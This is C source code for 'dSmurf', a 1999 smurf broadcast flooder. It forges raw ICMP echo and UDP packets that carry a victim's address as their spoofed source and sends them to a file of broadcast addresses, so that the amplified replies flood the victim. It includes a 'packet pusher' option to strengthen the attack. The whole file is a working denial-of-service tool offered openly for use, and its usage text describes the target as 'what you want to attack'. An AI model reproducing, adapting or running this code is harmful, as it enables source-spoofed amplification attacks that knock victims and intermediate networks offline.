#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#ifdef __USE_BSD
#undef __USE_BSD
#endif
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>

/* Defines */
#define VERSION "6+LPG"
#define REGISTERED_TO "Xess0r"
#define RELEASE_DATE "Feb 1'st, 1999 - Too a new month of chaos"

struct smurf_t
{
    struct sockaddr_in sin;                     /* socket prot structure */
    int s;                                      /* socket */
    int udp, icmp;					/* icmp, udp booleans */
    int rnd;                                    /* Random dst port boolean */
    int psize;                                  /* packet size */
    int chutimes, chusize, chuc;			/* int those pushers */
    int num;                                    /* number of packets to send */
    int delay;                                  /* delay between (in ms) */
    int verbose;						/* verbose anyone? */
    u_short dstport[25+1];                      /* dest port array (udp) */
    u_short srcport;                            /* source port (udp) */
    char *padding;                              /* junk data */
};

/* function prototypes */
void usage (char *);
void ctrlc(int);
u_long resolve (char *);
void getports (struct smurf_t *, char *);
void smurficmp (struct smurf_t *, u_long);
void smurfudp (struct smurf_t *, u_long, int);
u_short in_chksum (u_short *, int);

int 
main (int argc, char *argv[])
{
    struct smurf_t sm;
    struct stat st;
    struct sockaddr_in sin;
    u_long bcast[1024];
    char buf[32];
    int c, fd, n, cycle, sock, num = 0, on = 1; 
    FILE *bcastfile;

  system("clear");
  printf("\n\n\n\n\n[1;30m-[1;36mW[0;36ma[1;36mR[1;30m-    [1;32md[0;32mSmurf %s  [1;30m-  [1;34mB[0;34mroadcast[0m [1;34mF[0;34mlooder[0m\n",VERSION);
  printf("[1;30m-[1;36mW[0;36ma[1;36mR[1;30m-    [1;34mA[0;34muthor[1;30m: [0;34mTFreak   [0m+   [1;34mM[0;34modes by[1;30m: [0;34mDeathRoad[0m\n");
  printf("[1;30m-[1;36mW[0;36ma[1;36mR[1;30m-    [1;34mR[0;34megistered to[1;30m: [0;34m%s[0m\n",REGISTERED_TO);
  printf("[1;30m-[1;36mW[0;36ma[1;36mR[1;30m-    [1;34mR[0;34meleased on[1;30m: [0;34m%s[0m\n",RELEASE_DATE);
  printf("[1;30m-[1;36mW[0;36ma[1;36mR[1;30m-    [1;34mv[0m.[0;34mNote[1;30m:[0m Added a packet pusher to help the attack on more powerful machines.[0m\n\n");

    if (argc < 3) 
        usage(argv[0]);

    /* set defaults */
    memset((struct smurf_t *) &sm, 0, sizeof(sm));
    sm.icmp = 1;
    sm.psize = 64;
    sm.num = 0;
    sm.delay = 10000;
    sm.sin.sin_port = htons(0);
    sm.sin.sin_family = AF_INET;
    sm.srcport = 0;
    sm.dstport[0] = 7;
    sm.verbose = 0;
    sm.chutimes = 0;
    sm.chusize = 500;
    sm.chuc = 0;

    /* resolve 'source' host, quit on error */
    sm.sin.sin_addr.s_addr = resolve(argv[1]);

    /* open the broadcast file */
    if ((bcastfile = fopen(argv[2], "r")) == NULL)
    {
        perror("[1;31mO[0;31mpening broadcast file[0m");
        exit(-1);
    }

    /* parse out options */
    optind = 3;
    while ((c = getopt(argc, argv, "vrRn:d:p:P:s:S:f:c:C:")) != -1)
    {
        switch (c)
        {
            /* random dest ports */
            case 'r':
                sm.rnd = 1;
                break;

            /* random src/dest ports */
            case 'R':
                sm.rnd = 1;
                sm.srcport = 0;
                break;

            /* number of packets to send */
            case 'n':
                sm.num = atoi(optarg);
                break;

            /* usleep between packets (in ms) */
            case 'd':
                sm.delay = atoi(optarg);
                break;

            /* Times to run packet pusher */
            case 'c':
                sm.chutimes = atoi(optarg);
                break;

            /* Size of the packets */
            case 'C':
                sm.chusize = atoi(optarg);
                break;
            
            /* quite mode */
            case 'v':
                sm.verbose = 1;
                break;
		
            /* multiple ports */
            case 'p':
                if (strchr(optarg, ',')) 
                    getports(&sm, optarg);
                else
                    sm.dstport[0] = (u_short) atoi(optarg);
                break;

            /* specify protocol */
            case 'P':
                if (strcmp(optarg, "icmp") == 0)
                {
                    /* this is redundant */
                    sm.icmp = 1;
                    break;
                }
                if (strcmp(optarg, "udp") == 0)
                {
                    sm.icmp = 0;
                    sm.udp = 1;
                    break;
                }
                if (strcmp(optarg, "both") == 0)
                {
                    sm.icmp = 1;
                    sm.udp = 1;
                    break;
                }

                puts("[1;31mE[0;31mrror[1;30m: [1;32mP[0;32mrotocol must be [1;32micmp[1;30m, [1;32mudp [0;32mor [1;32mboth[0m");
                exit(-1);

            /* source port */
            case 's':
                sm.srcport = (u_short) atoi(optarg);
                break;

            /* specify packet size */
            case 'S':
                sm.psize = atoi(optarg);
                break;

            /* filename to read padding in from */
            case 'f':
                /* open and stat */
                if ((fd = open(optarg, O_RDONLY)) == -1)
                {
                    perror("[1;31mO[0;31mpening packet data file");
                    exit(-1);
                }
                if (fstat(fd, &st) == -1)
                {
                    perror("fstat()");
                    exit(-1);
                }

                /* malloc and read */
                sm.padding = (char *) malloc(st.st_size);
                if (read(fd, sm.padding, st.st_size) < st.st_size)
                {
                    perror("read()");
                    exit(-1);
                }

                sm.psize = st.st_size;
                close(fd);
                break;

            default:
                usage(argv[0]);
        }
    } /* end getopt() loop */
            
    /* create packet padding if neccessary */
    if (!sm.padding)
    {
        sm.padding = (char *) malloc(sm.psize);
        memset(sm.padding, 0, sm.psize);
    }

    /* create the raw socket */
    if ((sm.s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    {
        perror("[1;31mC[0;31mreating raw socket [1;30m([0;32mare you [1;32mroot[0m?[1;30m)[0m");
        exit(-1);
    }

    /* Include IP headers ourself (thanks anyway though) */
    if (setsockopt(sm.s, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)
    {
        perror("setsockopt()");
        exit(-1);
    }

    /* read in our broadcasts and store them in our array */
    while (fgets(buf, sizeof buf, bcastfile) != NULL)
    {
        char *p;
        int valid;

        /* skip over comments/blank lines */
        if (buf[0] == '#' || buf[0] == '\n') continue;

        /* get rid of newline */ 
        buf[strlen(buf) - 1] = '\0';

        /* check for valid address */
        for (p = buf, valid = 1; *p != '\0'; p++)
        {
            if ( ! isdigit(*p) && *p != '.' ) 
            {
                fprintf(stderr, "[1;31mS[0;31mkipping invalid ip [1;32m%s[0m\n", buf);
                valid = 0;
                break;
            }
        }

        /* if valid address, copy to our array */
        if (valid)
        {
            bcast[num] = inet_addr(buf);
            num++;
            if (num == 1024)
                break;
        }
    } /* end bcast while loop */

    /* Make sure the packets arn't too big */
    if(sm.psize > 1024) {
        perror("[1;31mP[0;31macket size [1;30m([0;32mless then [1;32m1024[1;30m)[0m");
      exit(-1);
    }

    /* seed our random function */
    srand(time(NULL) * getpid());

printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mV[0;34mictim     [1;30m: [1;31m%s[0m\n",argv[1]);
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mB[0;34mcast      [1;30m: [1;31m%s[0m\n",argv[2]);
if (sm.srcport == 0)
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mSP[0;34mort      [1;30m: [1;31mR[0;31mandom[0m\n");
else
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mSP[0;34mort      [1;30m: [1;31m%d[0m\n",sm.srcport);
if (!sm.num)
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mN[0;34mumber     [1;30m: [1;31mU[0;31mnlimited[0m\n");
else
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mN[0;34mumber     [1;30m: [1;31m%d[0m\n",sm.num);
if (sm.rnd == 1) 
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mR[0;34mandom     [1;30m: [1;31mD[0;31mest[0m\n");
if (sm.udp)
{
   if(!sm.rnd)
	printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mP[0;34mort       [1;30m: [1;31m%d[0m\n",sm.dstport[0]);
}
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mW[0;34mait       [1;30m: [1;31m%d[0m\n",sm.delay);
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mS[0;34mize       [1;30m: [1;31m%d[0m\n",sm.psize);
if (sm.icmp) 
printf("[1;10m- [1;30m([1;32md[0;32mS[1;30m) [0m[1;10m- [1;34mP[0;34mrotocols  [1;30m: [1;31mICMP[0m\n");
if (sm.udp) 
printf("[1;10m- [1;30m([1;32md[0;32mS) [0m[1;10m- [1;34mP[0;34mrotocols  [1;30m: [1;31mUDP[0m\n");
if (sm.chutimes > 0)
{
printf("[1;10m- [1;30m([1;32md[0;32mS) [0m[1;10m- [1;34mP[0;34mushing    [1;30m: [1;31m%d T[0;31mimes[0m\n",sm.chutimes);
printf("[1;10m- [1;30m([1;32md[0;32mS) [0m[1;10m- [1;34mP[0;34mushing    [1;30m: [1;31m%d B[0;31mytes[0m\n",sm.chusize);
}
if (sm.verbose == 1)
printf("[1;30m[[1;31mF[0;31mlooding [1;30m([1;34meach dot is 100 packets[1;30m)][0m\n");
if (sm.verbose == 0)
printf("[1;30m[[1;31mF[0;31mlooding[1;30m][0m\n\n");

    /* wee.. */
    for (n = 0, cycle = 0; n < sm.num || !sm.num; n++)
    {
        if (sm.icmp)
            smurficmp(&sm, bcast[cycle]);

        if (sm.udp)
        {
            int x;
            for (x = 0; sm.dstport[x] != 0; x++)
                smurfudp(&sm, bcast[cycle], x);
        }

        /* quick nap */
        usleep(sm.delay);

        /* cosmetic psychadelic dots */
        if (sm.verbose == 1)
        {
            if (n % 100 == 0)
            {
                printf(".");
                fflush(stdout);
            }
         }
        
        cycle = (cycle + 1) % num;
    
    /* lets add CHU */
    if(sm.chutimes > 0) {
    if(sm.chusize > 1024) { printf("[1;31mCHU[0;31m size is too big!\n[0m"); exit(-1); }
    if(sm.chutimes > 50) { printf("[1;31mCHU[0;31m times is too big!\n[0m"); exit(-1); }
    for(;sm.chuc<=sm.chutimes;sm.chuc++)
    smurficmp(&sm, bcast[cycle]);
    /* exit(1); */
    }

    }

    exit(0);
}
  
void 
usage (char *s)
{
    printf("[1;30m-[0;35mW[1;30m- [0;31mUsage[1;30m:\n");
    printf("[1;30m-[0;35mW[1;30m-  [0;32m%s [1;30m<[0;32msource host[1;30m> <[0;32mbrodcast file[1;30m> [[0;32m-p ports[1;30m] [[0;32m-s port[1;30m] [[0;32m-P protocols[1;30m] [[0;32m-S size[1;30m] [[0;32m-f file[1;30m] [[0;32m-n number[1;30m] [[0;32m-d time[1;30m] [[0;32m-c times[1;30m] [[0;32m-C size[1;30m] [[0;32m-r[1;30m] [[0;32m-R[1;30m] [[0;32m-v[1;30m][0m\n",s);
    printf("[1;30m-[0;35mW[1;30m-   [0;32msource host       [1;30m: [0mWhat you want to attack                      [1;30m[[0;35mExample[1;30m: [0;35m192.0.0.1[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32mbrodcast file     [1;30m: [0mFile where the bordcast IP's are             [1;30m[[0;35mExample[1;30m: [0;35mbcasts[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-p [1;30m<[0;32mports[1;30m>        [1;30m: [0mComma separated list of dest ports (UDP)     [1;30m[[0;35mDeafult[1;30m: [0;35m7[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-s [1;30m<[0;32mport[1;30m>         [1;30m: [0mSource port                                  [1;30m[[0;35mDeafult[1;30m: [0;35mRANDOM[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-P [1;30m<[0;32mprotocols[1;30m>    [1;30m: [0mProtocols to use                             [1;30m[[0;35mExample[1;30m: [0;35micmp[1;30m, [0;35mudp[1;30m, [0;35mboth[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-S [1;30m<[0;32msize[1;30m>         [1;30m: [0mPacket size in bytes (< 1024)                [1;30m[[0;35mDeafult[1;30m: [0;35m64[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-f [1;30m<[0;32mfile[1;30m>         [1;30m: [0mFilename containg packet data                [1;30m[[0;35mExample[1;30m: [0;35mpdata[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-n [1;30m<[0;32mnumber[1;30m>       [1;30m: [0mNumber of packets to send                    [1;30m[[0;35mDeafult[1;30m: [0;35mUNLIMITED[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-d [1;30m<[0;32mtime[1;30m>         [1;30m: [0mDelay inbetween packets (in ms)              [1;30m[[0;35mDeafult[1;30m: [0;35m10000[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-c [1;30m<[0;32mtimes[1;30m>        [1;30m: [0mTimes to run packet pusher (< 50)            [1;30m[[0;35mDeafult[1;30m: [0;35m0[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-C [1;30m<[0;32msize[1;30m>         [1;30m: [0mSize of packets being pushed (< 1024)        [1;30m[[0;35mDeafult[1;30m: [0;35m500[1;30m][0m\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-r                [1;30m: [0mUse random dest ports\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-R                [1;30m: [0mUse random src/dest ports\n");
    printf("[1;30m-[0;35mW[1;30m-   [0;32m-v                [1;30m: [0mShow how many packets are being sent\n\n");
    exit(-1);
}


u_long 
resolve (char *host)
{
    struct in_addr in;
    struct hostent *he;

    /* try ip first */
    if ((in.s_addr = inet_addr(host)) == -1)
    {
        /* nope, try it as a fqdn */
        if ((he = gethostbyname(host)) == NULL)
        {
            /* can't resolve, bye. */
            herror("[1;31mR[0;31mesolving victim host[0m");
            exit(-1);
        }

        memcpy( (caddr_t) &in, he->h_addr, he->h_length);
    }

    return(in.s_addr);
}
        

void 
getports (struct smurf_t *sm, char *p)
{
    char tmpbuf[16];
    int n, i;

    for (n = 0, i = 0; (n < 25) && (*p != '\0'); p++, i++)
    {
        if (*p == ',')
        {
            tmpbuf[i] = '\0';
            sm->dstport[n] = (u_short) atoi(tmpbuf);
            n++; i = -1;
            continue;
        }

        tmpbuf[i] = *p;
    }
    tmpbuf[i] = '\0';
    sm->dstport[n] = (u_short) atoi(tmpbuf);
    sm->dstport[n + 1] = 0;
}

void
smurficmp (struct smurf_t *sm, u_long dst)
{
    struct iphdr *ip;
    struct icmphdr *icmp;
    char *packet;

    int pktsize = sizeof(struct iphdr) + sizeof(struct icmphdr) + sm->psize;

    packet = malloc(pktsize);
    ip = (struct iphdr *) packet;
    icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

    memset(packet, 0, pktsize);

    /* fill in IP header */
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(pktsize);
    ip->id = htons(getpid());
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->check = 0;
    ip->saddr = sm->sin.sin_addr.s_addr;
    ip->daddr = dst;

    /* fill in ICMP header */
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = htons(~(ICMP_ECHO << 8));  /* thx griffin */

    /* send it on its way */
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,
        sizeof(struct sockaddr)) == -1)
    {
        perror("sendto()");
        exit(-1);
    }

    free(packet);                                       /* free willy! */
}


void
smurfudp (struct smurf_t *sm, u_long dst, int n)
{
    struct iphdr *ip;
    struct udphdr *udp;
    char *packet, *data;

    int pktsize = sizeof(struct iphdr) + sizeof(struct udphdr) + sm->psize;

    packet = (char *) malloc(pktsize);
    ip = (struct iphdr *) packet;
    udp = (struct udphdr *) (packet + sizeof(struct iphdr));
    data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr));

    memset(packet, 0, pktsize);
    if (*sm->padding)
        memcpy((char *)data, sm->padding, sm->psize);

    /* fill in IP header */
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(pktsize);
    ip->id = htons(getpid());
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = sm->sin.sin_addr.s_addr;
    ip->daddr = dst;

    /* fill in UDP header */
    if (sm->srcport) udp->source = htons(sm->srcport);
    else udp->source = htons(rand());
    if (sm->rnd) udp->dest = htons(rand());
    else udp->dest = htons(sm->dstport[n]);
    udp->len = htons(sizeof(struct udphdr) + sm->psize);
//    udp->check = in_chksum((u_short *)udp, sizeof(udp));

    /* send it on its way */
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,
        sizeof(struct sockaddr)) == -1)
    {
        perror("sendto()");
        exit(-1);
    }

    free(packet);                               /* free willy! */
}

/* if CTRL+C was pressed, exit the process and print out a little message */
 void ctrlc (int ignored)
 {
    puts("[1;30m[[1;31mD[0;31mone![1;30m][0m\n\n");
    exit(1);
 }

u_short
in_chksum (u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) 
    {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) 
    {
        *(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum + 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}
